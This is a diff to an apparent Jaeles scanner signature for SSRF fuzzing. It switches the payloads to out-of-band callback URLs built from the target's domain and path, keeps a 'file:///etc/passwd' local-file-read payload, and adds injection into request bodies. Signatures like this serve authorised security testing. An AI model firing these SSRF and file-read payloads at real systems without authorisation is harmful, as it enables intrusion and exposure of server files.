@@ -3,20 +3,22 @@ type: fuzz
 info:
   name: SSRF
   risk: High
-
+  author: "@GochaOqradze"
+   
 # jaeles scan -p 'dest=xx.burpcollaborator.net' ...
 params:
   - dest: '{{.oob}}'
 
 payloads: 
-  - "http://{{.dest}}"
-  - "{{.dest}}"
+  - "http://{{.Domain}}.{{.dest}}/{{.URL}}"
+  - "https://{{.Domain}}.{{.dest}}/{{.URL}}"
   - "file:///etc/passwd"
 
 requests:
   - redirect: true
   - generators:
       - Query("{{.payload}}")
+      - Body("{{.payload}}")
       - Path("{{.payload}}", "*")
 
   - detections:
